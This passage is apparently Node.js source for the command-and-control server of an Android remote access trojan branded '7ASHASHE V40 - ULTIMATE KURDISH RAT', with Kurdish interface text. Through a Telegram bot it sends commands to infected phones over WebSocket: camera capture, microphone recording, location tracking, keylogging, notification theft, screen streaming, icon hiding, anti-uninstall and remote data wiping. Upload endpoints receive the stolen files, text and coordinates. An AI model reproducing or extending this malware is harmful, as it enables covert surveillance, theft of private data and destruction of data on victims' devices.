            `🛑 **کوشتنی ئەپ**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `📱 ئەپ: ${appPackage}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
    }

    blockApp(clientId, appPackage) {
        this.blockedApps.set(`${clientId}:${appPackage}`, true);
        
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'block_app',
                app: appPackage,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `🚫 **بلۆکی ئەپ**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `📱 ئەپ: ${appPackage}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...\n\n` +
            `✅ ئەپەکە بلۆک کرا`,
            { parse_mode: 'Markdown' }
        );
    }

    unblockApp(clientId, appPackage) {
        this.blockedApps.delete(`${clientId}:${appPackage}`);
        
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'unblock_app',
                app: appPackage,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `✅ **لابردنی بلۆکی ئەپ**\n\n` +
            `📱 ئەپ: ${appPackage}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
    }
}

const appKiller = new AppKiller();

// =====================================================
// 🚀 WIFI & BLUETOOTH CONTROL (لە V39ەوە)
// =====================================================
class WifiBluetoothControl {
    constructor() {
        this.wifiState = new Map();
        this.bluetoothState = new Map();
    }

    toggleWifi(clientId, enable) {
        const client = clients.get(clientId);
        if (!client) return;

        this.wifiState.set(clientId, enable);
        
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'toggle_wifi',
                enable,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `${enable ? '📶' : '❌'} **وایفای ${enable ? 'داگیرسا' : 'کوژایەوە'}**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
    }

    toggleBluetooth(clientId, enable) {
        const client = clients.get(clientId);
        if (!client) return;

        this.bluetoothState.set(clientId, enable);
        
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'toggle_bluetooth',
                enable,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `${enable ? '📱' : '❌'} **بلوتوس ${enable ? 'داگیرسا' : 'کوژایەوە'}**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
    }

    changeDeviceName(clientId, newName) {
        const client = clients.get(clientId);
        if (!client) return;

        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'change_device_name',
                name: newName,
                timestamp: Date.now()
            }));
        }
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `📝 **گۆڕینی ناوی ئامێر**\n\n` +
            `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
            `📱 ناوی نوێ: ${newName}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
    }
}

const wifiBluetoothControl = new WifiBluetoothControl();

// =====================================================
// 🚀 WEBSOCKET CONNECTION
// =====================================================
wss.on('connection', (ws, req) => {
    const clientId = uuidv4();
    const clientInfo = {
        id: clientId,
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        userAgent: req.headers['user-agent'],
        connectedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        model: req.headers.model || 'نەزانراو',
        manufacturer: req.headers.manufacturer || 'نەزانراو',
        androidVersion: req.headers.android || 'نەزانراو',
        battery: req.headers.battery || 'نەزانراو',
        ram: req.headers.ram || 'نەزانراو',
        storage: req.headers.storage || 'نەزانراو',
        root: req.headers.root || 'نەزانراو',
        country: req.headers.country || 'نەزانراو',
        carrier: req.headers.carrier || 'نەزانراو'
    };
    
    clients.set(clientId, { ws, info: clientInfo });
    
    const db = readDB();
    db.clients[clientId] = clientInfo;
    db.stats.total_connections++;
    writeDB(db);
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `🔌 **ئامێری نوێ پەیوەندی کرد**\n\n` +
        `📱 **مۆدێل:** ${clientInfo.manufacturer} ${clientInfo.model}\n` +
        `📱 **ئەندرۆید:** ${clientInfo.androidVersion}\n` +
        `🔋 **پاتری:** ${clientInfo.battery}\n` +
        `💾 **RAM:** ${clientInfo.ram}\n` +
        `📁 **Storage:** ${clientInfo.storage}\n` +
        `🔓 **Root:** ${clientInfo.root}\n` +
        `🌍 **وڵات:** ${clientInfo.country}\n` +
        `🌐 **IP:** ${clientInfo.ip}\n` +
        `🆔 **ئایدی:** ${clientId.substring(0, 8)}...`,
        { parse_mode: 'Markdown' }
    );
    
    ws.on('message', async (data) => {
        try {
            const message = JSON.parse(data);
            clientInfo.lastSeen = new Date().toISOString();
            
            switch(message.type) {
                case 'ping':
                    ws.send(JSON.stringify({ type: 'pong', timestamp: Date.now() }));
                    break;
                    
                case 'notification':
                    notificationListener.captureNotification(message.notification);
                    break;
                    
                case 'keylog':
                    smartKeylogger.logKey(clientId, message.key, message.app);
                    break;
                    
                case 'screen_frame':
                    const stream = screenStreamer.getActiveStreams().find(s => s.clientId === clientId);
                    if (stream) {
                        stream.frames++;
                    }
                    break;
                    
                case 'spam_progress':
                    contactsSpam.updateProgress(message.spamId, message.sent, message.total);
                    break;
                    
                case 'call_forwarded':
                    const forward = callForwarding.forwardings.get(message.forwardId);
                    if (forward) {
                        forward.forwardedCalls++;
                    }
                    break;
                    
                case 'cam_snapshot':
                    const filename = `cam_${clientId.substring(0, 8)}_${Date.now()}.jpg`;
                    const filepath = path.join(DIRS.CAM_SNAPSHOTS, filename);
                    const base64Data = message.image.replace(/^data:image\/jpeg;base64,/, '');
                    fs.writeFileSync(filepath, base64Data, 'base64');
                    
                    bot.sendPhoto(CONFIG.CHAT_ID, Buffer.from(base64Data, 'base64'), {
                        caption: `📸 **وێنەی کامێرا**\n\n` +
                                `📱 ئامێر: ${clientInfo.manufacturer} ${clientInfo.model}\n` +
                                `⏰ کات: ${new Date().toLocaleString('ckb')}`,
                        parse_mode: 'Markdown'
                    });
                    
                    const db = readDB();
                    db.stats.cam_snapshots++;
                    writeDB(db);
                    break;
                    
                case 'sim_changed':
                    simChangeAlert.handleSimChange(clientId, message.simInfo);
                    break;
                    
                case 'boot_complete':
                    autoBoot.handleBootComplete(clientId);
                    break;
                    
                default:
                    console.log('Unknown message type:', message.type);
            }
        } catch (error) {
            console.error('WebSocket message error:', error);
        }
    });
    
    ws.on('close', () => {
        clients.delete(clientId);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `🔌 **ئامێر پەیوەندی پچڕاند**\n\n` +
            `📱 مۆدێل: ${clientInfo.manufacturer} ${clientInfo.model}\n` +
            `🆔 ئایدی: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
    });
    
    ws.send(JSON.stringify({ type: 'init', clientId }));
});

// =====================================================
// 🏠 WEB INTERFACE
// =====================================================
app.get('/', (req, res) => {
    const db = readDB();
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl" lang="ckb">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>7ASHASHE V40 - ULTIMATE KURDISH RAT</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    background: #000;
                    color: #0f0;
                    font-family: 'Courier New', monospace;
                    padding: 20px;
                    background-image: 
                        linear-gradient(0deg, transparent 24%, rgba(0,255,0,0.03) 25%, rgba(0,255,0,0.03) 26%, transparent 27%, transparent),
                        linear-gradient(90deg, transparent 24%, rgba(0,255,0,0.03) 25%, rgba(0,255,0,0.03) 26%, transparent 27%, transparent);
                    background-size: 50px 50px;
                }
                .container { max-width: 1400px; margin: 0 auto; }
                .header {
                    border: 3px solid #0f0;
                    padding: 30px;
                    margin-bottom: 30px;
                    background: #111;
                    box-shadow: 0 0 50px rgba(0,255,0,0.3);
                    text-align: center;
                }
                .header h1 {
                    font-size: 4em;
                    text-shadow: 0 0 20px #0f0;
                    animation: glitch 3s infinite;
                }
                @keyframes glitch {
                    0%,100% { text-shadow: 0 0 20px #0f0; }
                    25% { text-shadow: -5px 0 #f00, 5px 0 #00f; }
                    75% { text-shadow: 5px 0 #f00, -5px 0 #00f; }
                }
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(4, 1fr);
                    gap: 20px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    border: 2px solid #0f0;
                    padding: 20px;
                    text-align: center;
                    background: #111;
                }
                .stat-value { font-size: 2.5em; font-weight: bold; }
                .feature-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 15px;
                    margin: 30px 0;
                }
                .feature {
                    border: 1px solid #0f0;
                    padding: 15px;
                    text-align: center;
                    background: #111;
                }
                .footer {
                    text-align: center;
                    margin-top: 50px;
                    padding: 20px;
                    border-top: 2px solid #0f0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🔴 7ASHASHE V40</h1>
                    <p>ULTIMATE KURDISH RAT</p>
                    <p>👑 ${CONFIG.MASTER}</p>
                    <p>🌐 پۆرت: ${CONFIG.PORT}</p>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value">${clients.size}</div>
                        <div>ئامێرە پەیوەستکراوەکان</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${db.stats.notifications_captured || 0}</div>
                        <div>نۆتیفیکەیشن دزراو</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${screenStreamer.activeStreams}</div>
                        <div>Stream چالاک</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${db.stats.cam_snapshots || 0}</div>
                        <div>وێنەی کامێرا</div>
                    </div>
                </div>
                
                <div class="feature-grid">
                    <div class="feature">🔄 ڕیستارتی خۆکار</div>
                    <div class="feature">📱 گوێگرتنی نۆتیفیکەیشن</div>
                    <div class="feature">📹 Streamی شاشە</div>
                    <div class="feature">⌨️ کێڤلۆگەری زیرەک</div>
                    <div class="feature">🚫 دژە-سڕینەوە</div>
                    <div class="feature">👁️ شاردنەوەی ئایکۆن</div>
                    <div class="feature">🎤 گوێگرتنی ڕاستەوخۆ</div>
                    <div class="feature">📸 سکرینشۆتی زیرەک</div>
                    <div class="feature">⚡ کۆنترۆڵی کامێرا</div>
                    <div class="feature">🔋 دژە-باتری</div>
                    <div class="feature">📱 ئاگاداری سیمکارت</div>
                    <div class="feature">💥 سڕینەوەی دوور</div>
                    <div class="feature">💬 پەیامی ساختە</div>
                    <div class="feature">🔄 ڕیستارتی خۆکار</div>
                </div>
                
                <div class="footer">
                    <p>7ASHASHE V40 - ULTIMATE KURDISH RAT</p>
                    <p>🦁 💀 🔥</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

// =====================================================
// 📤 FILE UPLOAD ENDPOINTS
// =====================================================
app.post('/upload/file', upload.single('file'), (req, res) => {
    try {
        const { model, uuid, type } = req.headers;
        const { originalname, buffer, size } = req.file;
        
        const fileName = `${Date.now()}_${originalname}`;
        let saveDir = DIRS.FILES;
        
        switch(type) {
            case 'photo': saveDir = DIRS.PHOTOS; break;
            case 'video': saveDir = DIRS.VIDEOS; break;
            case 'audio': saveDir = DIRS.AUDIO; break;
            default: saveDir = DIRS.FILES;
        }
        
        const savePath = path.join(saveDir, fileName);
        fs.writeFileSync(savePath, buffer);
        
        bot.sendDocument(CONFIG.CHAT_ID, buffer, {
            caption: `📁 **فایلی نوێ**\n\n` +
                    `📱 ئامێر: ${model || 'نەزانراو'}\n` +
                    `📄 ناو: ${originalname}\n` +
                    `📦 قەبارە: ${(size / 1024).toFixed(2)}KB\n` +
                    `🆔 ئایدی: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
            parse_mode: 'Markdown'
        });
        
        res.json({ success: true, fileName });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/upload/text', (req, res) => {
    const { model, uuid, type } = req.headers;
    const { text } = req.body;
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `📝 **${type || 'پەیام'} لە ${model || 'نەزانراو'}**\n\n` +
        `${text}\n\n` +
        `🆔 ئایدی: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
        { parse_mode: 'Markdown' }
    );
    
    res.json({ success: true });
});

app.post('/upload/location', (req, res) => {
    const { model, uuid } = req.headers;
    const { lat, lon } = req.body;
    
    bot.sendLocation(CONFIG.CHAT_ID, lat, lon);
    bot.sendMessage(CONFIG.CHAT_ID,
        `📍 **شوێنی ${model || 'نەزانراو'}**\n\n` +
        `Google Maps: https://maps.google.com/?q=${lat},${lon}\n` +
        `🆔 ئایدی: ${uuid ? uuid.substring(0, 8) : 'نەزانراو'}...`,
        { parse_mode: 'Markdown' }
    );
    
    res.json({ success: true });
});

// =====================================================
// 🤖 TELEGRAM BOT - فەرمانە سەرەکییەکان
// =====================================================
bot.onText(/\/start/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) {
        bot.sendMessage(msg.chat.id, '⛔ **ڕێگەپێدان نەدرا**');
        return;
    }
    
    bot.sendMessage(CONFIG.CHAT_ID,
        '🔴 **7ASHASHE V40 - ULTIMATE KURDISH RAT**\n\n' +
        '✅ **بەخێربێیت، 7ASHASHE!**\n\n' +
        '📱 **ئامێرەکان** - پیشاندانی ئامێرە پەیوەستکراوەکان\n' +
        '📊 **ئامار** - ئامارەکانی سیستەم\n' +
        '⚡ **فەرمانەکان** - ناردنی فەرمان بۆ ئامێرەکان\n' +
        '🔧 **پێشکەوتوو** - فەرمانە پێشکەوتووەکان',
        {
            reply_markup: {
                keyboard: [
                    ['📱 ئامێرەکان', '📊 ئامار'],
                    ['⚡ فەرمانەکان', '🔧 پێشکەوتوو']
                ],
                resize_keyboard: true
            }
        }
    );
});

bot.onText(/📱 ئامێرەکان/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    let text = '📱 **ئامێرە پەیوەستکراوەکان**\n\n';
    clients.forEach((client, id) => {
        text += `📱 **مۆدێل:** ${client.info.manufacturer} ${client.info.model}\n` +
                `🔋 **پاتری:** ${client.info.battery}\n` +
                `🌍 **وڵات:** ${client.info.country}\n` +
                `🆔 **ئایدی:** ${id.substring(0, 8)}...\n\n`;
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, text, { parse_mode: 'Markdown' });
});

bot.onText(/📊 ئامار/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    const db = readDB();
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `📊 **ئامارەکانی سیستەم**\n\n` +
        `📱 ئامێرە پەیوەستکراوەکان: ${clients.size}\n` +
        `📸 وێنە دزراوەکان: ${db.stats.cam_snapshots || 0}\n` +
        `📱 نۆتیفیکەیشن دزراوەکان: ${db.stats.notifications_captured || 0}\n` +
        `📹 Stream چالاک: ${screenStreamer.activeStreams}\n` +
        `🔑 کلیک تۆمارکراوەکان: ${smartKeylogger.logs.length}\n` +
        `🚫 هەوڵی سڕینەوە: ${db.stats.anti_uninstall_attempts || 0}\n` +
        `📱 گۆڕینی سیم: ${db.stats.sim_changes || 0}\n` +
        `⏱️ ماوەی کارکردن: ${Math.floor(process.uptime() / 3600)}:${Math.floor((process.uptime() % 3600) / 60)}:${Math.floor(process.uptime() % 60)}`,
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/⚡ فەرمانەکان/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        return;
    }
    
    const deviceKeyboard = [];
    clients.forEach((client, id) => {
        deviceKeyboard.push([{
            text: `${client.info.manufacturer} ${client.info.model}`,
            callback_data: `device:${id}`
        }]);
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, '📱 **ئامێرێک هەڵبژێرە**', {
        reply_markup: { inline_keyboard: deviceKeyboard }
    });
});

bot.onText(/🔧 پێشکەوتوو/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    bot.sendMessage(CONFIG.CHAT_ID,
        '🔧 **فەرمانە پێشکەوتووەکان**\n\n' +
        '📱 **دژە-سڕینەوە** - چالاککردنی سیستمی دژە-سڕینەوە\n' +
        '👁️ **شاردنەوەی ئایکۆن** - ونکردنی ئایکۆنی ئەپەکە\n' +
        '🎤 **گوێگرتنی ڕاستەوخۆ** - گوێگرتن لە دەنگ بۆ ماوەی دیاریکراو\n' +
        '📸 **سکرینشۆتی زیرەک** - چاودێری کردنی ئەپێک\n' +
        '⚡ **کۆنترۆڵی کامێرا** - وێنەگرتن بە کامێرا\n' +
        '🔋 **دژە-باتری** - ناچالاککردنی پاشەکەوتکردنی وزە\n' +
        '📱 **ئاگاداری سیمکارت** - ئاگاداربوون لە گۆڕینی سیم\n' +
        '💥 **سڕینەوەی داتا** - سڕینەوەی دووری داتاکان\n' +
        '💬 **پەیامی ساختە** - ناردنی پەیامی ساختە بۆ شاشە\n' +
        '🔄 **ڕیستارتی خۆکار** - چالاککردنی ڕیستارتی خۆکار',
        { parse_mode: 'Markdown' }
    );
});

// =====================================================
// 🔘 CALLBACK QUERY HANDLER
// =====================================================
bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const [command, clientId] = callbackQuery.data.split(':');
    
    if (command === 'device') {
        const client = clients.get(clientId);
        if (!client) {
            bot.editMessageText('❌ ئامێرەکە پەیوەندی پچڕاند', {
                chat_id: msg.chat.id,
                message_id: msg.message_id
            });
            return;
        }
        
        bot.editMessageText(
            `📱 **${client.info.manufacturer} ${client.info.model}**\n\n` +
            `📱 ئەندرۆید: ${client.info.androidVersion}\n` +
            `🔋 پاتری: ${client.info.battery}\n` +
            `🌍 وڵات: ${client.info.country}\n` +
            `🌐 IP: ${client.info.ip}\n\n` +
            `**⚡ فەرمانێک هەڵبژێرە:**`,
            {
                chat_id: msg.chat.id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📸 کامێرا', callback_data: `camera:${clientId}` },
                            { text: '🎤 مایک', callback_data: `mic:${clientId}` }
                        ],
                        [
                            { text: '📍 شوێن', callback_data: `location:${clientId}` },
                            { text: '📁 فایلەکان', callback_data: `files:${clientId}` }
                        ],
                        [
                            { text: '📱 نۆتیفیکەیشن', callback_data: `notifications:${clientId}` },
                            { text: '⌨️ کێڤلۆگەر', callback_data: `keylogger:${clientId}` }
                        ],
                        [
                            { text: '📹 Streamی شاشە', callback_data: `screen:${clientId}` },
                            { text: '🎤 گوێگرتنی ڕاستەوخۆ', callback_data: `audio_stream:${clientId}` }
                        ],
                        [
                            { text: '👁️ شاردنەوەی ئایکۆن', callback_data: `hide_icon:${clientId}` },
                            { text: '🔋 دژە-باتری', callback_data: `battery_bypass:${clientId}` }
                        ],
                        [
                            { text: '🚫 دژە-سڕینەوە', callback_data: `anti_uninstall:${clientId}` },
                            { text: '💥 سڕینەوەی داتا', callback_data: `wipe:${clientId}` }
                        ],
                        [
                            { text: '📱 ئاگاداری سیمکارت', callback_data: `sim_alert:${clientId}` },
                            { text: '💬 پەیامی ساختە', callback_data: `toast:${clientId}` }
                        ],
                        [
                            { text: '📶 وایفای', callback_data: `wifi:${clientId}` },
                            { text: '📱 بلوتوس', callback_data: `bluetooth:${clientId}` }
                        ],
                        [
                            { text: '🔄 ڕیستارتی خۆکار', callback_data: `auto_boot:${clientId}` }
                        ]
                    ]
                },
                parse_mode: 'Markdown'
            }
        );
    }
    
    const commandTypes = [
        'camera', 'mic', 'location', 'files', 'notifications',
        'keylogger', 'screen', 'audio_stream', 'hide_icon',
        'battery_bypass', 'anti_uninstall', 'wipe', 'sim_alert',
        'toast', 'wifi', 'bluetooth', 'auto_boot'
    ];
    
    if (commandTypes.includes(command)) {
        const client = clients.get(clientId);
        if (!client) {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ ئامێرەکە پەیوەندی پچڕاند',
                show_alert: true
            });
            return;
        }
        
        if (client.ws.readyState === WebSocket.OPEN) {
            let wsCommand = command;
            
            // Convert to appropriate WebSocket command
            const commandMap = {
                'camera': 'take_photo',
                'mic': 'record_audio',
                'location': 'get_location',
                'files': 'list_files',
                'notifications': 'start_notifications',
                'keylogger': 'start_keylogger',
                'screen': 'start_screen_stream',
                'audio_stream': 'start_audio_stream',
                'hide_icon': 'hide_icon',
                'battery_bypass': 'enable_battery_bypass',
                'anti_uninstall': 'enable_anti_uninstall',
                'wipe': 'wipe_data',
                'sim_alert': 'enable_sim_alert',
                'toast': 'show_toast',
                'wifi': 'toggle_wifi',
                'bluetooth': 'toggle_bluetooth',
                'auto_boot': 'enable_auto_boot'
            };
            
            client.ws.send(JSON.stringify({
                type: commandMap[command] || command,
                timestamp: Date.now()
            }));
            
            bot.answerCallbackQuery(callbackQuery.id, {
                text: `✅ فەرمان نێردرا`,
                show_alert: false
            });
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `✅ **فەرمان نێردرا**\n\n` +
                `📱 ئامێر: ${client.info.manufacturer} ${client.info.model}\n` +
                `⚡ فەرمان: ${command}\n` +
                `🕐 کات: ${new Date().toLocaleString('ckb')}`,
                { parse_mode: 'Markdown' }
            );
        } else {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ پەیوەندی لەگەڵ ئامێرەکە نییە',
                show_alert: true
            });
        }
    }
});

// =====================================================
// 🔄 PING & KEEP ALIVE
// =====================================================
setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
        }
    });
}, CONFIG.PING_INTERVAL);

// =====================================================
// 🚀 START SERVER
// =====================================================
server.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log(`✅ 7ASHASHE V40 running on port ${CONFIG.PORT}`);
    console.log(`🌐 http://localhost:${CONFIG.PORT}`);
    console.log(`🔥 ULTIMATE KURDISH RAT - ${CONFIG.MASTER}`);
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `🔥 **7ASHASHE V40 - ULTIMATE KURDISH RAT**\n\n` +
        `👑 **${CONFIG.MASTER}**\n` +
        `📊 وەشان: ${CONFIG.VERSION}\n` +
        `🌐 پۆرت: ${CONFIG.PORT}\n` +
        `⏱️ کات: ${new Date().toLocaleString('ckb')}\n\n` +
        `✅ **١٠ تایبەتمەندی نوێ:**\n` +
        `1. 🚫 دژە-سڕینەوە\n` +
        `2. 👁️ شاردنەوەی ئایکۆن\n` +
        `3. 🎤 گوێگرتنی ڕاستەوخۆ\n` +
        `4. 📸 سکرینشۆتی زیرەک\n` +
        `5. ⚡ کۆنترۆڵی کامێرا\n` +
        `6. 🔋 دژە-باتری\n` +
        `7. 📱 ئاگاداری سیمکارت\n` +
        `8. 💥 سڕینەوەی دوور\n` +
        `9. 💬 پەیامی ساختە\n` +
        `10. 🔄 ڕیستارتی خۆکار\n\n` +
        `🦁 **7ASHASHE**`
    );
});

// =====================================================
// 🛡️ ERROR HANDLING
// =====================================================
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection:', reason);
});
